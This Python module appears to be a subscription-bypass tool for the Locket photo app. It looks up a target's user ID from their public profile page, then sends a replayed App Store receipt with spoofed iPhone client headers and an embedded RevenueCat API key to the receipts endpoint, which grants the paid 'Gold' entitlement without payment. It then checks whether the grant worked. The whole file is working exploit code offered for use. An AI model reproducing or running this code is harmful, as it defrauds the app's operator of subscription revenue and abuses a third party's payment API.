import aiohttp
import json
import re
import time
import asyncio
from datetime import datetime, timezone
from app.config import TOKEN_SETS # Import new structure

HEADERS = {
    'Host': 'api.revenuecat.com',
    'Authorization': 'Bearer appl_JngFETzdodyLmCREOlwTUtXdQik',
    'Content-Type': 'application/json',
    'Accept': '*/*',
    'X-Platform': 'iOS',
    'X-Platform-Version': 'Version 26.2 (Build 23C55)',
    'X-Platform-Device': 'iPhone15,3',
    'X-Platform-Flavor': 'native',
    'X-Version': '5.41.0',
    'X-Client-Version': '2.32.2',
    'X-Client-Bundle-ID': 'com.locket.Locket',
    'X-Client-Build-Version': '3',
    'X-StoreKit2-Enabled': 'true',
    'X-StoreKit-Version': '2',
    'X-Observer-Mode-Enabled': 'false',
    'X-Is-Sandbox': 'true', # Will be overwritten by token set
    'X-Storefront': 'VNM',
    'X-Apple-Device-Identifier': '39A73C25-1E05-4350-ADA7-5CD3FE1079E8',
    'X-Preferred-Locales': 'vi_KR,ko_KR,en_KR',
    'X-Nonce': 'w0Mlb6+AmV4WYuVv',
    'X-Is-Backgrounded': 'false',
    'X-Retry-Count': '0',
    'X-Is-Debug-Build': 'false',
    'User-Agent': 'Locket/3 CFNetwork/3860.300.31 Darwin/25.2.0',
    'Accept-Language': 'vi-VN,vi;q=0.9',
    'Connection': 'keep-alive',
    'Pragma': 'no-cache',
    'Cache-Control': 'no-cache',
    'X-RevenueCat-ETag': ''
}

class Clr:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    GREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'

async def resolve_uid(username):
    url = f"https://locket.cam/{username}"
    headers = {
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X)",
        "Accept": "text/html"
    }
    
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(url, headers=headers, allow_redirects=True, timeout=10) as res:
                html = await res.text()
                redirect_url = str(res.url)

                def extract(text):
                    if not text: return None
                    m = re.search(r'/invites/([A-Za-z0-9]{28})', text)
                    if m: return m.group(1)
                    
                    lp = re.search(r'link=([^\s"\'>]+)', text)
                    if lp:
                        try:
                            # Basic URL decode without urllib
                            d = lp.group(1).replace('%3A', ':').replace('%2F', '/')
                            dm = re.search(r'/invites/([A-Za-z0-9]{28})', d)
                            if dm: return dm.group(1)
                        except:
                            pass
                    return None

                return extract(redirect_url) or extract(html)
        
    except Exception:
        return None

async def check_status(uid):
    url = f"https://api.revenuecat.com/v1/subscribers/{uid}"
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(url, headers=HEADERS, timeout=10) as res:
                if 200 <= res.status < 300:
                    data = await res.json()
                    entitlements = data.get('subscriber', {}).get('entitlements', {}).get('Gold', {})
                    if entitlements:
                        expires_date = entitlements.get('expires_date')
                        if 'expires_date' not in entitlements:
                            return {"active": False, "expires": None, "reason": "invalid_expiry"}
                        if expires_date is None:
                            return {"active": True, "expires": None}
                        try:
                            dates = [expires_date]
                            grace_date = entitlements.get('grace_period_expires_date')
                            if grace_date is not None:
                                dates.append(grace_date)
                            parsed = [datetime.fromisoformat(value.replace('Z', '+00:00')) for value in dates]
                            if any(value.tzinfo is None for value in parsed):
                                raise ValueError('Expiry must include a timezone')
                            active = max(parsed) > datetime.now(timezone.utc)
                        except (TypeError, ValueError, AttributeError):
                            return {"active": False, "expires": expires_date, "reason": "invalid_expiry"}
                        return {"active": active, "expires": expires_date, "reason": None if active else "expired"}
                    return {"active": False}
                return None
    except Exception:
        return None

async def inject_gold(uid, token_config, log_callback=None):
    def log(msg):
        if log_callback:
            log_callback(msg)

    url = "https://api.revenuecat.com/v1/receipts"
    
    # Use provided token config
    fetch_token = token_config['fetch_token']
    app_transaction = token_config['app_transaction']
    is_sandbox = token_config['is_sandbox']
    
    body = {
        "product_id": "locket_199_1m", 
        "fetch_token": fetch_token, 
        "app_transaction": app_transaction,
        "app_user_id": uid, 
        "is_restore": True, 
        "store_country": "VNM", 
        "currency": "USD",
        "price": "1.99", 
        "normal_duration": "P1M", 
        "subscription_group_id": "21419447",
        "observer_mode": False, 
        "initiation_source": "restore", 
        "offers": [],
        "attributes": { 
            "$attConsentStatus": { "updated_at_ms": int(time.time() * 1000), "value": "notDetermined" } 
        }
    }
    
    current_headers = HEADERS.copy()
    current_headers['Content-Length'] = str(len(json.dumps(body)))
    
    if token_config.get('hash_params'):
        current_headers['X-Post-Params-Hash'] = token_config['hash_params']
    if token_config.get('hash_headers'):
        current_headers['X-Headers-Hash'] = token_config['hash_headers']
    
    # Important update based on token type
    current_headers['X-Is-Sandbox'] = str(is_sandbox).lower()

    log(f"{Clr.BLUE}[*] Target Identified:{Clr.ENDC} {uid}")
    log(f"{Clr.BLUE}[*] Loading Exploit Payload (RevenueCat)...{Clr.ENDC}")
    log(f"{Clr.BLUE}[*] Using Token Set: {token_config.get('name', 'Custom')}{Clr.ENDC}")

    async with aiohttp.ClientSession() as session:
        for attempt in range(5):
            try:
                log(f"{Clr.WARNING}[>] Attempt {attempt+1}/5:{Clr.ENDC} Sending Receipt...")
                async with session.post(url, headers=current_headers, json=body, timeout=15) as res:
                    status_code = res.status
                    
                    if status_code == 200:
                        log(f"{Clr.GREEN}[+] HTTP 200 OK.{Clr.ENDC} Verifying Entitlement...")
                        status = await check_status(uid)
                        if status and status.get('active'):
                            log(f"{Clr.GREEN}[SUCCESS] Gold Entitlement Active!{Clr.ENDC}")
                            return True, "SUCCESS"
                        else:
                            log(f"{Clr.WARNING}[!] Entitlement not found immediately. Retrying verification...{Clr.ENDC}")
                            await asyncio.sleep(2)
                            status = await check_status(uid)
                            if status and status.get('active'):
                                log(f"{Clr.GREEN}[SUCCESS] Gold Active after delay.{Clr.ENDC}")
                                return True, "SUCCESS"
                            if status is None:
                                message = "Receipt accepted, but Gold status could not be verified."
                            elif status.get('reason') == 'expired':
                                message = f"Receipt accepted, but Gold expired at {status['expires']}."
                            elif status.get('reason') == 'invalid_expiry':
                                message = "Receipt accepted, but Gold expiry could not be verified."
                            else:
                                message = "Receipt accepted, but no Gold entitlement was granted."
                            log(f"{Clr.FAIL}[-] {message}{Clr.ENDC}")
                            return False, message
                            
                    elif status_code == 529:
                        log(f"{Clr.WARNING}[!] Server Busy (529). Cooldown 2s...{Clr.ENDC}")
                        await asyncio.sleep(2)
                        continue
                        
                    else:
                        msg = "Unknown Error"
                        try:
                            resp_json = await res.json()
                            msg = resp_json.get('message', str(status_code))
                        except:
                            msg = str(status_code)
                        log(f"{Clr.FAIL}[x] Request Rejected: {msg}{Clr.ENDC}")
                        return False, f"Rejected: {msg}"
                    
            except Exception as e:
                log(f"{Clr.FAIL}[!] Network Error: {e}{Clr.ENDC}")
                if attempt == 4:
                    return False, f"Request Error: {str(e)}"
                await asyncio.sleep(2)
            
    return False, "Timeout / Failed after retries"
